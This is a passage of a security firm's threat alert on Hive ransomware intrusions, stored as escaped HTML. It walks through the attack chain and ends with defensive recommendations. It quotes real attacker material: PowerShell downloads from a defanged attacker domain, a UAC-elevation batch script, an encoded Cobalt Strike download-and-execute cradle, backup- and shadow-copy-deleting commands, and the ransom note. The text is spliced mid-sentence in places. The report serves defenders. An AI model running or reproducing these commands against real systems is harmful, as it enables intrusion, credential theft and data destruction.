The initial Batloader script downloads \u0026ldquo;requestadmin.bat\u0026rdquo; and attempts to execute it with evaluated privileges by \u003ca rel=\"noopener noreferrer\" href=\"https://www.nirsoft.net/utils/nircmd.html\" target=\"_blank\"\u003enircmd.exe\u003c/a\u003e.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003epowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?servername=msi -OutFile requestadmin.bat\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?servername=msi -OutFile nircmd.exe\n\ncmd  /c nircmd elevatecmd exec hide \"requestadmin.bat\"\nping  127.0.0.1 -n 20\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 4: update.bat\u003c/p\u003e\n\u003cp\u003eThe \u0026ldquo;requestadmin.bat\u0026rdquo; then attempts to download further scripts named \u0026ldquo;runanddelete.bat\u0026rdquo; and \u0026ldquo;scripttodo.ps1\u0026rdquo;. The script itself also attempts to whitelist specific paths from Windows Defender before downloading \u003ca rel=\"noopener noreferrer\" href=\"https://nsudo.m2team.org/en-us/\" target=\"_blank\"\u003eNsudo.exe\u003c/a\u003e. Nsudo provides capabilities to execute binaries with elevated privileges, which are then used to edit the system registry to disable the user access control prompt and to disable task manager and other registry tools. The Windows power system settings tool Powercfg is then executed to disable sleep, which will allow the threat actor to maintain persistent access.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003eset pop=%systemroot%\ncd %APPDATA%\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?servername=msi -OutFile runanddelete.bat\ncd %APPDATA%\npowershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?servername=msi -OutFile scripttodo.ps1\nstart /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"\u0026amp; This script attempts to spawn the user access control prompt to gain the increased privileges to then spawn an Administrator shell, via a created file named \u0026ldquo;getadmin.vbs\u0026rdquo;. Once increased privileges are achieved, it then attempts to run Ursnif (d2ef5.exe).  Ursnif can be used to extract system information and seek to steal user credentials.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003e@echo off\n\ntitle Installing Packages \n:: BatchGotAdmin\n::-------------------------------------\nREM  --\u0026gt; Check for permissions\n\u0026gt;nul 2\u0026gt;\u0026amp;1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\n\nREM --\u0026gt; If error flag set, we do not have admin.\nif '%errorlevel%' NEQ '0' (\n    echo Requesting administrative privileges...\n    goto UACPrompt\n) else ( goto gotAdmin )\n\n:UACPrompt\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) \u0026gt; \"%temp%\\getadmin.vbs\"\n    set params = %*:\"=\"\n    echo UAC.ShellExecute \"cmd.exe\", \"/c %~s0 %params%\", \"\", \"runas\", 0 \u0026gt;\u0026gt; \"%temp%\\getadmin.vbs\"\n\n    \"%temp%\\getadmin.vbs\"\n    del \"%temp%\\getadmin.vbs\"\n    exit /B\n\n:gotAdmin\n\necho  Installing Necessary Packages.....Please Wait.....\n\ncd %APPDATA%\n\nstart /b d2ef5.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 6: runanddelete.bat\u003c/p\u003e\n\u003cp\u003eThe script \u0026ldquo;scripttodo.ps1\u0026rdquo; initially installs GNU Privacy Guard for Windows (\u0026ldquo;\u003ca rel=\"noopener noreferrer\" href=\"https://www.gpg4win.org/\" target=\"_blank\"\u003eGpg4Win\u003c/a\u003e\u0026rdquo;), which is a file encryption software. This is likely an attempt to dump NTLM credential hashes for password cracking, or for pass the hash techniques. PowerSploit has also been identified with attempts to run \u0026ldquo;Invoke-Kerberoast\u0026rdquo; to gain Kerberos ticket hashes for service accounts. This would likely provide the threat actor with increased privileges or access if successful.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1003.001: Credential Dumping \u0026ndash; LSASS Memory\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1558.003: Kerberoasting\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1550: Use Alternate Authentication Material\u003c/p\u003e\n\u003cp\u003eCommon remote access software such as Splashtop can be installed via Cobalt Strike to provide a persistent, seemingly legitimate access to the network. This also allows the threat actor to conduct hands-on operations. Remote Desktop Protocol (RDP) is used with legitimate accounts to navigate across the network.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1219: Remote Access Software\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1021: Remote Services\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eInternal Scouting\u003c/h3\u003e\n\u003cp\u003eOnce the threat actor gains a foothold within the network, Kroll has observed the use of tools such as \u003ca rel=\"noopener noreferrer\" href=\"https://attack.mitre.org/software/S0552/\" target=\"_blank\"\u003eADFind\u003c/a\u003e to identify accounts and servers. Other common tools such as nslookup and whoami have also been used to gain initial system information.\u003c/p\u003e\n\u003cp\u003eThe Exchange PowerShell module Get-DomainController has also been identified when leveraging Cobalt Strike to execute commands. This module provides information on the domain controller for the local domain. \u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003epowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgA3ADUANwAyAC8AJwApADsAIABHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA\n\n---Decoded Base64 string---\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:7572/'); Get-DomainController\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 9: Example of Cobalt Strike commands\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1482: Domain Trust Discovery\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1087: Account Discovery\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1016: System Network Configuration Discovery\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eMission Execution\u003c/h3\u003e\n\u003cp\u003eThe threat actors look to identify sensitive files for exfiltration before encrypting devices by using tools such as Rclone to automate data extraction to cloud storage. Kroll has observed that threat actors have searched for files using PowerShell and manual traversal across files.\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1005: Data from Local System\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1020: Automate Exfiltration\u003c/p\u003e\n\u003cp\u003eTo push the ransomware binary across the network, the sysinternals tool PsExec has been leveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself appears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and password \".\\windows_x64_encrypt.exe -u login:password\u0026rdquo;. There are other options available for file encryption including:\u003c/p\u003e\n\u003cul style=\"margin-left: 40px;\"\u003e\n    \u003cli\u003e-local-only: Encrypt only local files.\u003c/li\u003e\n    \u003cli\u003e-no-discovery: Do not look for network shares.\u003c/li\u003e\n    \u003cli\u003e-explicit-only: Encrypt specific directories.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBy default, the binary prevents recovery by deleting volume shadow copies \u0026ldquo;vssadmin.exe delete shadows /all /quiet\u0026rdquo; and deletes system backups with \u0026ldquo;wbadmin.exe delete systemstatebackup\u0026rdquo; and \u0026ldquo;wbadmin.exe delete catalog-quiet\u0026rdquo; before preventing recovery from boot with \u0026ldquo;\\bcdedit.exe /set {default} recoveryenabled No\u0026rdquo; and \u0026ldquo;bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures\u0026rdquo;. \u003ca rel=\"noopener noreferrer\" href=\"https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/\" target=\"_blank\"\u003eThe binary encrypts files\u003c/a\u003e, except for \u0026ldquo;.lnk\u0026rdquo; files and binaries within \u0026ldquo;C:\\windows\u0026rdquo;, before generating two key files in the root of C:\\. The key files also determine the extension string added to the encrypted files along with a base64 encoded pointer.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003eYour network has been breached and all data were encrypted.                    \nPersonal data, financial reports and important documents are ready to disclose.\n\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at    \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/         \nyou will need to purchase our decryption software.   \n                          \nPlease contact our sales department at:   \n                                     \n   http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/      \n   \n      Login: \u0026lt;redacted\u0026gt;\u003credacted\u003e \n      Password: \u0026lt;redacted\u0026gt;\u003credacted\u003e\n\t  \nTo get an access to .onion websites download and install Tor Browser at:       \n   https://www.torproject[.]org/ (Tor Browser is not related to us) \n   \n   \nFollow the guidelines below to avoid losing your data:   \n                      \n - Do not modify, rename or delete *.key files. 24px;\"\u003eRecommendations\u003c/h2\u003e\n\u003cp\u003eKroll has identified recommendations relating to this alert:\u003c/p\u003e\n\u003ctable style=\"width: 100%; height: 100%;\"\u003e\n    \u003ctbody\u003e\n        \u003ctr\u003e\n            \u003ctd style=\"text-align: left; vertical-align: middle;\"\u003e\n            \u003cp style=\"text-align: center;\"\u003e\u003cstrong\u003eRecommendation\u003c/strong\u003e\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp style=\"text-align: center;\"\u003e\u003cstrong\u003eObservation\u003c/strong\u003e\u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eMonitor PowerShell execution\u003c/p\u003e\n            \u003cp\u003eEnsure PowerShell is logged, and create detections for encoded script execution.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThe threat actor utilized Cobalt Strike. Monitoring PowerShell execution can identify malicious activity associated with Cobalt Strike.\n            \u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eEnable credential guard\u003c/p\u003e\n            \u003cp\u003e\u003ca rel=\"noopener noreferrer\" href=\"https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard\" target=\"_blank\"\u003eWindows Credential Guard\u003c/a\u003e can provide protection against password extraction and other authentication attacks.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThe threat actor dumped LSASS and conducted Kerberos attacks. Credential guard can offer some protection against these attacks.\u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eAudit user, administrator and service accounts\u003c/p\u003e\n            \u003cp\u003eEnsure accounts have the correct access and privileges. Implement the principle of least privilege.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThe threat actor is often able to install tools on user endpoints. Limiting the privileges of users can prevent a threat actor from installing malicious software.\u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eImplement multi-factor authentication\u003c/p\u003e\n            \u003cp\u003eMulti-factor authentication can restrict access to sensitive areas and can prevent lateral movement.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eEnabling multi-factor authentication can prevent a threat actor from moving laterally and accessing sensitive data.\u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eReview backup strategies\u003c/p\u003e\n            \u003cp\u003eEnsure multiple backups are taken and at least one backup is isolated from the network.\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd style=\"text-align: left; vertical-align: middle;\"\u003e\n            \u003cp\u003eAs a ransomware actor\u0026rsquo;s main aim is to disrupt business, ensuring a viable backup and recovery strategy is in place can allow a business to recover quickly.\u003c/p\u003e\n            \u003cp\u003e\n            \u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd\u003e\n            \u003cp\u003eReview remote access tools\u003c/p\u003e\n            \u003c/td\u003e\n            \u003ctd\u003e\n            \u003cp\u003eThreat actors leverage legitimate remote access tools to maintain persistence. Ensure remote access is monitored and that only approved remote access tools exist in the environment.\u003c/p\u003e\n            \u003c/td\u003e\n        \u003c/tr\u003e\n
